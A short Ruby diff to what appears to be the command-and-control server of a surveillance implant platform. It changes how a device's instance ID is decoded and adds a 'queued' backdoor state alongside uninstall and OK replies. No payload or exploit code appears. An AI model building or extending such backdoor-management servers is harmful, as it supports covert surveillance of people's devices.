@@ -56,7 +56,7 @@ class Protocol
 
     # instance of the device
     instance_id = message.slice!(0..19)
-    trace :info, "[#{peer}] Auth -- InstanceId: " << instance_id.unpack('H*').to_s
+    trace :info, "[#{peer}] Auth -- InstanceId: " << instance_id.unpack('H*').first
 
     # subtype of the device
     subtype = message.slice!(0..15)
@@ -87,6 +87,7 @@ class Protocol
 
     # remove the trailing zeroes from the strings
     build_id.delete!("\x00")
+    instance_id = instance_id.unpack('H*').first
     subtype.delete!("\x00")
 
     # random key part chosen by the server
@@ -105,11 +106,15 @@ class Protocol
     # ask the database the status of the backdoor
     status, bid = DB.instance.status_of(build_id, instance_id, subtype)
 
+    response = [Commands::PROTO_NO].pack('i')
     # what to do based on the backdoor status
     case status
       when DB::DELETED_BACKDOOR, DB::NO_SUCH_BACKDOOR, DB::CLOSED_BACKDOOR
         response = [Commands::PROTO_UNINSTALL].pack('i')
         trace :info, "[#{peer}] Uninstall command sent"
+      when DB::QUEUED_BACKDOOR
+        response = [Commands::PROTO_NO].pack('i')
+        trace :warn, "[#{peer}] was queued for license limit exceeded"
       when DB::ACTIVE_BACKDOOR
         # everything is ok
         response = [Commands::PROTO_OK].pack('i')
